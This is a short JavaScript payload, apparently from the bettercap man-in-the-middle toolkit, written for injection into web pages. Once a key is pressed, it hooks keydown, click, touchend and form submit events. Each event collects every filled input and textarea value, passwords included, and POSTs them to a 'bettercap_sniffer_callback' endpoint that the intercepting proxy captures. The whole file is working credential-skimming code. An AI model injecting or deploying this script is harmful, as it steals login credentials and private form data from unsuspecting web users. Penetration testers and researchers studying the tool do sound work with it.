var hooked = false

function callback() {
	var inputs    = document.getElementsByTagName("input"),
	    textareas = document.getElementsByTagName("textarea"),
	    params    = ""
	for (var i = 0; i < inputs.length; i++) {
		if (inputs[i].value != "") {
			params = params + inputs[i].name + "=" + inputs[i].value + ( i < (inputs.length-1) ? "&" : "" )
		}
	}
	for (var i = 0; i < textareas.length; i++) {
		if (textareas[i].value != "") {
			params = params + textareas[i].name + "=" + textareas[i].value + ( i < (textareas.length-1) ? "&" : "" )
		}
	}
	if (params.length > 0) {
	  req = new XMLHttpRequest()
	  req.open("POST", "http://" + location.host + "/bettercap_sniffer_callback?" + params, true)
	  req.send()
	}
}

self.addEventListener("keydown", function(event) {
	(event.key == "Enter" || event.keyCode == 13) ? callback() : ""
	if (hooked == false) {
		self.addEventListener("click", callback)
		self.addEventListener("touchend", callback)
		forms = document.querySelectorAll("form")
		for (var i = 0; i < forms.length; i++) {
			forms[i].addEventListener("submit", callback)
		}
		hooked = true
	}
})
